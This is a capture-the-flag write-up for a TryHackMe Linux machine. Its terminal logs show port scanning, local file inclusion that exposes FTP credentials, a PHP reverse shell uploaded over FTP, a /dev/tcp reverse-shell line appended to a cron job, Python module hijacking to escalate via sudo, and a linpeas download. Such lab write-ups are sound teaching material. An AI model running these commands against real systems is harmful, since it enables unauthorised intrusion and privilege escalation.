# Watcher — Writeup

## Overview
### Watcher — Writeup
### Watcher — Writeup
----
A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.
---
![222](https://i.imgur.com/Lw4QXO1.jpg)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/ee0b7b107f207147ca54ab2c651551ef.png)
### Watcher
Start Machine
Work your way through the machine and try to find all the flags you can!
Made by [@rushisec](https://twitter.com/rushisec)
Answer the questions below

## Enumeration
```bash
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.202.105 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.202.105:22
Open 10.10.202.105:21
Open 10.10.202.105:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.202.105 [3 ports]
Discovered open port 80/tcp on 10.10.202.105
Discovered open port 21/tcp on 10.10.202.105
Discovered open port 22/tcp on 10.10.202.105
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.202.105
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.202.105.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.202.105
Host is up, received user-set (0.24s latency).

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e180ec1f269e32eb273f26acd237ba96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36ff7011058ed4507a29915875ac2e76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48d23e45da0cf0f6654ef9789737aa8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.63 seconds

http://10.10.202.105/robots.txt

User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt

view-source:http://10.10.202.105/flag_1.txt

FLAG{robots_dot_text_what_is_next}

view-source:http://10.10.202.105/secret_file_do_not_read.txt

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.202.105 Port 80</address>
</body></html>

http://10.10.202.105/post.php?post=secret_file_do_not_read.txt

Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.202.105
Connected to 10.10.202.105.
220 (vsFTPd 3.0.3)
Name (10.10.202.105:witty): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
229 Entering Extended Passive Mode (|||42209|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> more flag_2.txt
FLAG{ftp_you_and_me}

ftp> cd files
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||45852|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
226 Directory send OK.

ftp> put payload_ivan.php
local: payload_ivan.php remote: payload_ivan.php
229 Entering Extended Passive Mode (|||47626|)
150 Ok to send data.
100% |**************************************|  9284      792.65 KiB/s    00:00 ETA
226 Transfer complete.
9284 bytes sent in 00:00 (22.85 KiB/s)

http://10.10.202.105/post.php?post=/home/ftpuser/ftp/flag_2.txt

FLAG{ftp_you_and_me} 

http://10.10.202.105/post.php?post=/home/ftpuser/ftp/files/payload_ivan.php
┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.202.105] 56022
SOCKET: Shell has connected! PID: 2136
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@watcher:/var/www/html$ 
www-data@watcher:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@watcher:/var/www/html$ 
zsh: suspended  rlwrap nc -lvnp 1337
                                                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ stty raw -echo; fg
[1]  + continued  rlwrap nc -lvnp 1337
www-data@watcher:/var/www/html$ 

www-data@watcher:/var/www/html$ ls
ls
bunch.php   images		 post.php    secret_file_do_not_read.txt
css	    index.php		 robots.txt  striped.php
flag_1.txt  more_secrets_a9f10a  round.php
www-data@watcher:/var/www/html$ cd more_secrets_a9f10a
cd more_secrets_a9f10a
www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls
ls
flag_3.txt
www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
cat flag_3.txt
FLAG{lfi_what_a_guy}

www-data@watcher:/var/www/html/more_secrets_a9f10a$ find / -type f -name "flag*" 2>/dev/null | xargs ls -lah
</ -type f -name "flag*" 2>/dev/null | xargs ls -lah
-rw-r--r-- 1 root root   21 Dec  3  2020 /home/ftpuser/ftp/flag_2.txt
-rw------- 1 mat  mat    37 Dec  3  2020 /home/mat/flag_5.txt
-rw------- 1 toby toby   21 Dec  3  2020 /home/toby/flag_4.txt
-rw------- 1 will will   41 Dec  3  2020 /home/will/flag_6.txt
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS1/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS10/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS11/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS12/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS13/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS14/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS15/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS16/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS17/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS18/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS19/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS2/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS20/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS21/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS22/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS23/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS24/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS25/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS26/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS27/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS28/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS29/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS3/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS30/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS31/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS4/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS5/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS6/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS7/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS8/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/platform/serial8250/tty/ttyS9/flags
-r--r----- 1 root root 4.0K Mar 15 18:42 /sys/devices/pnp0/00:06/tty/ttyS0/flags
-rw-r--r-- 1 root root 4.0K Mar 15 18:42 /sys/devices/vif-0/net/eth0/flags
-rw-r--r-- 1 root root 4.0K Mar 15 18:42 /sys/devices/virtual/net/lo/flags
-rw-r--r-- 1 root root 4.0K Mar 15 18:42 /sys/devices/virtual/net/lxdbr0/flags
-rw-r--r-- 1 root root 4.0K Mar 15 18:42 /sys/devices/virtual/net/vethH5SDE5/flags
-rw-r--r-- 1 root root    0 Nov 23  2020 /usr/src/linux-headers-4.15.0-126-generic/include/config/arch/uses/high/vma/flags.h
-rw-r--r-- 1 root root 1.6K Jan 28  2018 /usr/src/linux-headers-4.15.0-126/scripts/coccinelle/locks/flags.cocci
-rw-r--r-- 1 root root    0 Dec  9  2020 /usr/src/linux-headers-4.15.0-128-generic/include/config/arch/uses/high/vma/flags.h
-rw-r--r-- 1 root root 1.6K Jan 28  2018 /usr/src/linux-headers-4.15.0-128/scripts/coccinelle/locks/flags.cocci
-rw-r--r-- 1 root root   35 Dec  3  2020 /var/www/html/flag_1.txt
-rw-r--r-- 1 root root   21 Dec  3  2020 /var/www/html/more_secrets_a9f10a/flag_3.txt

www-data@watcher:/home/toby$ sudo -u toby cat flag_4.txt
sudo -u toby cat flag_4.txt
FLAG{chad_lifestyle}

www-data@watcher:/home/toby$ cat note.txt
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat

www-data@watcher:/home/toby$ cd jobs
cd jobs
www-data@watcher:/home/toby/jobs$ ls
ls
cow.sh
www-data@watcher:/home/toby/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg

www-data@watcher:/home/toby/jobs$ cat /etc/crontab
cat /etc/crontab
```
```bash
# /etc/crontab: system-wide crontab
```
```bash
# Unlike any other crontab you don't have to run the `crontab'
```
```bash
# command to install the new version when you edit this file
```
```bash
# and files in /etc/cron.d. These files also have username fields,
```
```bash
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

## Exploitation
```bash
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh

www-data@watcher:/home/toby/jobs$ sudo -u toby /bin/bash
sudo -u toby /bin/bash

toby@watcher:~/jobs$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/1338 0>&1" >> cow.sh
<ash -i >& /dev/tcp/10.8.19.103/1338 0>&1" >> cow.sh
toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
/bin/bash -i >& /dev/tcp/10.8.19.103/1338 0>&1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.46.15] 34684
bash: cannot set terminal process group (2175): Inappropriate ioctl for device
bash: no job control in this shell
mat@watcher:~$ cd /home/mat
cd /home/mat
mat@watcher:~$ ls
ls
cow.jpg
flag_5.txt
note.txt
scripts
mat@watcher:~$ cat flag_5.txt
cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
mat@watcher:~$ cat note.txt
cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will

mat@watcher:~$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
mat@watcher:~$ cd scripts
cd scripts
mat@watcher:~/scripts$ ls -lah
ls -lah
total 16K
drwxrwxr-x 2 will will 4.0K Dec  3  2020 .
drwxr-xr-x 6 mat  mat  4.0K Dec  3  2020 ..
-rw-r--r-- 1 mat  mat   133 Dec  3  2020 cmd.py
-rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py

mat@watcher:~/scripts$ cat will_script.py
cat will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)

mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"

mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
</usr/bin/python3 /home/mat/scripts/will_script.py 1
total 20K
drwxrwxr-x 3 will will 4.0K Mar 15 21:59 .
drwxr-xr-x 6 mat  mat  4.0K Dec  3  2020 ..
-rw-r--r-- 1 mat  mat   133 Dec  3  2020 cmd.py
drwxr-xr-x 2 will will 4.0K Mar 15 21:59 __pycache__
-rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 2
</usr/bin/python3 /home/mat/scripts/will_script.py 2
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 3
</usr/bin/python3 /home/mat/scripts/will_script.py 3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash

┌──(witty㉿kali)-[/tmp]
└─$ cat cmd.py         
import os
def get_command(num):
	if(num == "1"):
		os.system("/bin/bash")
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"

mat@watcher:~/scripts$ cat << EOF > cmd.py
import os

def get_command(num):
    if num == "1":
        os.system("/bin/bash")
        return "ls -lah"
    elif num == "2":
        return "id"
    elif num == "3":
cat << EOF > cmd.py        return "cat /etc/passwd"
EOF

mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
import os

def get_command(num):
    if num == "1":
        os.system("/bin/bash")
        return "ls -lah"
    elif num == "2":
        return "id"
    elif num == "3":
        return "cat /etc/passwd"

mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
python3 -c 'import pty;pty.spawn("/bin/bash")'

will@watcher:~/scripts$ cd /home/will
cd /home/will
will@watcher:/home/will$ ls
ls
flag_6.txt
will@watcher:/home/will$ cat flag_6.txt
cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}

let's upload linpeas.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.46.15 - - [15/Mar/2023 18:12:20] "GET /linpeas.sh HTTP/1.1" 200 -

will@watcher:/home/will$ cd /tmp
cd /tmp
will@watcher:/tmp$ ls
ls
cow.jpg
systemd-private-4299b256f4914c5dabb6efdd98cbfad1-apache2.service-RcvrZa
systemd-private-4299b256f4914c5dabb6efdd98cbfad1-systemd-resolved.service-QXKnlS
systemd-private-4299b256f4914c5dabb6efdd98cbfad1-systemd-timesyncd.service-SXkG61
will@watcher:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   402KB/s    in 2.0s    

(402 KB/s) - ‘linpeas.sh’ saved [828098/828098]

will@watcher:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
will@watcher:/tmp$ ./linpeas.sh

./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-128-generic (buildd@lcy01-amd64-025) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020
User & Groups: uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
Hostname: watcher
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-128-generic (buildd@lcy01-amd64-025) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Wed 15 Mar 22:18:44 UTC 2023
 22:18:44 up 59 min,  0 users,  load average: 3.02, 2.23, 1.51

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-JDiX8mONRtORjihtAeB1NKbW4At1spD6uvcJcoIeLZvX833HMx9Ow9sxIsGsUsQe/	ext4	defaults	0 0
/dev/disk/by-uuid/e2eadcec-b293-4dba-b0a6-ec2a71093ce7	/boot	ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
SUDO_GID=1002
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/will
USER=will
SHLVL=4
HOME=/home/mat
OLDPWD=/home/will
SUDO_UID=1002
LOGNAME=will
_=./linpeas.sh
USERNAME=will
TERM=unknown
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
LANG=en_GB.UTF-8
HISTSIZE=0
LS_COLORS=
SUDO_COMMAND=/usr/bin/python3 /home/mat/scripts/will_script.py 1
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
SUDO_USER=mat
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
